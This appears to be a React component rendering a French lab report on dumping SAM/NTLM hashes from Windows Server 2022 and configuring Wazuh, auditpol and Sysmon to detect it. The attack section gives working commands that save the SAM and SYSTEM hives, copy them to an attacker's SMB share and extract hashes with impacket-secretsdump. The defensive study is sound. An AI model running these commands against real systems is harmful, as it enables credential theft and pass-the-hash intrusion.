import { ReportHeader, H2, H3, Cmd, Table } from './ReportUI'

export default function RapportCredentialDumping() {
  return (
    <article className="text-zinc-300 leading-relaxed">
      <ReportHeader
        title="Credential Dumping — SAM / NTLM"
        subtitle="Chapitre 6, Module 5 · MITRE T1003.002 (OS Credential Dumping: SAM)"
        meta="24 juin 2026 · Kali [KALI] → Windows Server 2022 [SERVEUR] · Wazuh 4.12.0"
      />

      <H2>1. Objectif</H2>
      <p>
        Extraire les hashes NTLM des comptes locaux Windows avec des outils 100% natifs (zéro outil
        externe sur la cible), puis configurer le SIEM pour détecter cette attaque. Prouver que sans bonne
        configuration, Wazuh ne voit rien — puis corriger cet angle mort.
      </p>

      <H2>2. L'attaque — Extraction des secrets</H2>
      <H3>Étape 1 & 2 — Sauvegarder les ruches SAM et SYSTEM</H3>
      <p>
        SAM = le « coffre-fort » des empreintes de mots de passe (chiffré). SYSTEM = la clé qui le
        déchiffre. Les deux sont nécessaires.
      </p>
      <Cmd term="Windows Server — PowerShell Admin">{`reg save HKLM\\SAM    C:\\Windows\\Temp\\sam.hive
reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hive`}</Cmd>
      <p>Opération légitime pour un Administrateur — Windows ne la considère pas comme une attaque.</p>

      <H3>Étape 3 à 5 — Exfiltrer via un partage SMB</H3>
      <Cmd term="Kali">{`impacket-smbserver share /tmp/loot -smb2support -username kali -password kali`}</Cmd>
      <Cmd term="Windows Server — PowerShell Admin">{`net use \\\\[KALI]\\share /user:kali kali
copy C:\\Windows\\Temp\\sam.hive    \\\\[KALI]\\share\\sam.hive
copy C:\\Windows\\Temp\\system.hive \\\\[KALI]\\share\\system.hive`}</Cmd>
      <p>
        (Evil-WinRM étant cassé sur le lab, on passe par SMB — méthode alternative valide en pentest
        réel. Windows Server 2022 refuse l'accès invité, d'où les identifiants obligatoires.)
      </p>

      <H3>Étape 6 — Extraire les hashes NTLM</H3>
      <Cmd term="Kali">{`impacket-secretsdump -sam /tmp/loot/sam.hive -system /tmp/loot/system.hive LOCAL`}</Cmd>
      <p>
        Sortie : les hashes NTLM des comptes locaux (format{' '}
        <span className="font-mono text-xs">Compte:RID:LM:NT:::</span>). Un attaquant s'en sert directement
        pour s'authentifier ailleurs (technique <b>Pass-the-Hash</b>) sans connaître le mot de passe.
      </p>

      <H2>3. Le problème — Angle mort du SIEM</H2>
      <p>
        <b>Avant configuration, Wazuh n'a détecté AUCUNE commande d'extraction.</b> Windows ne journalise
        pas par défaut le lancement des processus : sans savoir que{' '}
        <span className="font-mono text-xs">reg.exe save HKLM\SAM</span> a été lancé, Wazuh ne peut rien
        voir.
      </p>

      <H2>4. La défense — Configuration du SIEM</H2>
      <Table
        head={['Étape', 'Ce qu\'elle active']}
        rows={[
          ['auditpol (GUID processus)', 'Event 4688 — création de processus'],
          ['ProcessCreationIncludeCmdLine', 'La ligne de commande complète dans chaque event'],
          ['ScriptBlockLogging', 'Event 4104 — toutes les commandes PowerShell'],
          ['Sysmon + config', 'Events 1/3/8/10/11/13 (processus, réseau, LSASS, injection…)'],
          ['agent.conf Wazuh', 'Collecte des canaux PowerShell et Sysmon'],
        ]}
      />
      <Cmd term="Windows Server — PowerShell Admin">{`auditpol /set /subcategory:"{0CCE922B-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable
reg add "HKLM\\...\\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
Sysmon64.exe -accepteula -i sysmonconfig.xml`}</Cmd>

      <H2>5. Test de détection — Rejouer l'attaque</H2>
      <Cmd term="Windows Server — PowerShell Admin">reg save HKLM\SAM C:\Windows\Temp\test_sysmon.hive</Cmd>
      <Table
        head={['Heure', 'Rule ID', 'Niveau', 'Description']}
        rows={[
          ['22:21:13', '67027', '3', 'A process was created — reg.exe save HKLM\\SAM'],
          ['22:21:15', '92026', '14', 'Reg.exe used to dump SAM hive — CRITIQUE'],
        ]}
      />
      <p className="mt-2">
        La règle <b>92026 niveau 14</b> reconnaît spécifiquement l'extraction de la SAM via reg.exe :
        alerte rouge, détectée en moins de 2 secondes.
      </p>

      <H2>6. Leçon principale</H2>
      <p>
        <b>Un SIEM ne détecte que ce que le système lui dit.</b> Configurer Wazuh ne suffit pas — il faut
        aussi configurer Windows (Audit Policy, Command Line Logging, PowerShell Script Block Logging,
        Sysmon) pour qu'il génère les bons évènements. La qualité d'un SOC dépend directement de la qualité
        de sa télémétrie et de ses règles.
      </p>
    </article>
  )
}
